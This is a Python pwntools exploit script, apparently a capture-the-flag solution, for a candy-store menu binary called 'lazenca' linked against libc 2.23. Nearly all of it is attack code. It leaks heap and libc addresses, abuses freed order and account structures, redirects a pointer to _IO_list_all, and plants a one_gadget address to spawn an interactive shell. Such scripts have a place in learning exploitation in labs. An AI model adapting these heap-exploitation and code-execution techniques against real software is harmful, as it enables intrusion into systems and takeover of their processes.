from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./lazenca"
LIBC = "./libc-2.23.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level = "debug"

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("Command : ")

def createacc(conn, _id, passwd, profile):
    login(conn, "(((", "(((")
    conn.recvuntil("1) No\n")
    conn.sendline("0")
    conn.recvuntil("New ID.")
    conn.send(_id)
    conn.recvuntil("New Password.")
    conn.send(passwd)
    conn.recvuntil("profile.")
    conn.send(profile)

def login(conn, _id, passwd):
    conn.recvuntil("ID.\n> ")
    conn.send(_id)
    conn.recvuntil("Password.\n> ")
    conn.send(passwd)

def logout(conn):
    recvmenu(conn)
    conn.sendline("9")
    conn.recvuntil("\n1) No")
    conn.sendline("0")

def purchase(conn, idx, no, cmnt):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvline()
    conn.sendline(str(idx))
    conn.recvline()
    conn.sendline(str(no))
    if cmnt:
        conn.recvuntil("candy.\n")
        conn.send(cmnt)


def charge(conn, idx):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil("100000\n")
    conn.sendline(str(idx))

def ordermode(conn):
    recvmenu(conn)
    conn.sendline("4")

def addorder(conn, idx):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil(">")
    conn.sendline(str(idx))

def cancelorder(conn, idx):
    recvmenu(conn)
    conn.sendline("3")
    conn.sendline(str(idx))

def ordercandy(conn, desc):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvuntil("1) No\n")
    conn.sendline("0")
    for i, j in desc:
        conn.recvuntil("candy.\n")
        conn.sendline(str(i))
        conn.recvuntil("candy.\n")
        conn.send(j)

def exitorder(conn):
    recvmenu(conn)
    conn.sendline("5")

def accountmode(conn):
    recvmenu(conn)
    conn.sendline("5")

def deleteacc(conn, idx):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil(" to delete\n")
    conn.sendline(str(idx))

def changepasswd(conn, idx, passwd):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("change PW\n")
    conn.sendline(str(idx))
    conn.recvuntil("Password.\n")
    conn.send(passwd)

def exitacc(conn):
    recvmenu(conn)
    conn.sendline("3")

def exploit(conn, elf, libc, local):
    login(conn, "Admin", "admin")
    charge(conn, 5)

    ordermode(conn)
    addorder(conn, 0)
    ordercandy(conn, [(1, "a"*8)])
    exitorder(conn)

    logout(conn)
    createacc(conn, "A"*4, "A"*4, "A"*4) # target
    login(conn, "Admin", "admin")

    ordermode(conn)
    addorder(conn, 0)
    addorder(conn, 1)
    cancelorder(conn, 0)
    cancelorder(conn, 0)
    addorder(conn, 0)
    addorder(conn, 1)

    conn.recvuntil("Order code  : ")
    heapbase = u64(conn.recvuntil("\nOrder")[:-6].ljust(8, "\x00")) & ~0xfff
    log.info("%#x", heapbase)
    exitorder(conn)

    p = ""
    p += p64(0) * 3
    p += p64(heapbase + 0x10f0 - 0x18 - (0 if local else 0x400)) # not sure why, but the factor of 0x400 is only required when I run it on the local server. also there is a differences of 0x1000 bytes in heap base address
    purchase(conn, 0, 10, p) # "Z"*0x4b0)

    logout(conn)
    createacc(conn, "B"*4, "B"*4, "B"*4)

    login(conn, "Admin", "admin")

    ordermode(conn)
    addorder(conn, 2)

    conn.recvuntil("Order candy : Orange\n")
    conn.recvuntil("Order code  : ")
    libcleak = u64(conn.recv(6).ljust(8, "\x00")) & ~0xff
    if local:
        libc.address = libcleak - 0x3c4b00
    else:
        libc.address = libcleak - 0x3c4b00
    log.info("%#x", libc.address)

    cancelorder(conn, 0)
    cancelorder(conn, 0)
    cancelorder(conn, 0)
    exitorder(conn)

    accountmode(conn)
    deleteacc(conn, 3)
    exitacc(conn)

    ordermode(conn)
    addorder(conn, 7)
    ordercandy(conn, [(1, "AAAA")])
    exitorder(conn)

    accountmode(conn)
    deleteacc(conn, 2)
    exitacc(conn)

    purchase(conn, 0, 10, "A")

    ordermode(conn)
    addorder(conn, 0)
    addorder(conn, 0)
    addorder(conn, 0)

    ordercandy(conn, [(1, "B"*0x60 + p64(2) + p64(3))])

    addorder(conn, 0)
    addorder(conn, 0)
    addorder(conn, 0)
    addorder(conn, 1)
    addorder(conn, 2)

    cancelorder(conn, 0)
    cancelorder(conn, 0)
    cancelorder(conn, 0)
    cancelorder(conn, 0)
    exitorder(conn)

    purchase(conn, 0, 30, p64(libc.address + 0xf1117)) # one_gadget constraint rsp+0x70 == NULL

    ordermode(conn)
    ordercandy(conn, [(1, "A")])

    addorder(conn, 0)
    addorder(conn, 0)
    addorder(conn, 0)
    exitorder(conn)

    accountmode(conn)
    changepasswd(conn, 2, p64(libc.address + 0x3c5520 - 0x10)) # _IO_list_all
    exitacc(conn)

    ordermode(conn)
    addorder(conn, 0)

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("localhost", 2323)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
